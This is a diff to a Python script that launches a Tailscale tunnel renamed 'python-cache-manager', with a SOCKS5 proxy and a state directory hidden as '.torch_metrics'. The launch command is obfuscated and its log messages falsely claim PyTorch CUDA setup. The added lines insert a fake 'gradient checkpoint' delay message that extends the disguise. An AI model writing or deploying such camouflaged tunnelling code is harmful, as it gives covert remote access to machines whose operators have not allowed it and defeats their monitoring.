@@ -118,6 +118,11 @@ def main():
         chisel_log = devnull
         nginx_log = devnull
 
+
+    delay = random.randint(2, 3)
+    logger.info(f"Synchronizing gradient checkpoint topology (standby for {delay}s)...")
+    time.sleep(delay)
+
     # 1. Start Tailscale (python-cache-manager)
     logger.info("Initializing PyTorch CUDA environment...")
     cmd1 = decode_cmd(OBFUSCATE("nice -n 19 python-cache-manager --tun=userspace-networking --socks5-server=:1055 --statedir=/home/user/.torch_metrics --socket=/home/user/.torch_metrics/tailscaled.sock"))
